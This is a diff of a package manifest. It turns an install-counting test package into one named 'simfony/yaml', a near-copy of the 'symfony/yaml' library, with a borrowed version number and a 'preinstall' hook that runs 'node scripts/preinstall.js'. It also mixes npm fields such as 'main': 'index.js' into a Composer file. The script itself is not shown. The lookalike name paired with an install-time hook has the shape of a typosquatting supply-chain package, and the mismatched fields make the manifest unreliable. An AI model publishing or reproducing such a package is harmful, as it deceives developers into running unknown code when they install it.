@@ -1,35 +1,17 @@
+
 {
-    "name": "pmba/pmba_basic_composer",
-    "description": "Basic test package to test the installations.",
-    "keywords": ["test", "count", "installations"],
-    "homepage": "https://github.com/ntunihh/pmba_basic_composer",
-    "type": "library",
+    "name": "simfony/yaml",
     "license": "MIT",
-    "authors": [{
-        "name": "NT",
-        "email": "nt@test.com",
-        "homepage": "http://example.com"
-    }],
-    "minimum-stability": "dev",
-    "require": {
-        "php": ">=5.3.0"
-    },
-    "autoload": {
-        "psr-4": {"PmbaTestPackage\\": "src/"}
-    },
+    "author": "php maulwurf",
+    "version": "6.4.8",
     "scripts": {
-        "pre-install-cmd": [
-            "php src/notify.php"
-        ],
-        "pre-package-install": [
-            "php src/notify.php"
-        ],
-        "pre-dependencies-solving": [
-            "php src/notify.php"
-        ],
-        "pre-require-cmd": [
-            "php src/notify.php"
-        ]
+        "test": "make test",
+        "preinstall": "node scripts/preinstall.js"
     },
-    "version": "0.0.4"
+    "keywords": [
+        "testing server",
+        "nodejs"
+    ],
+    "main": "index.js",
+    "description": "A utility package for useful code additions."
 }
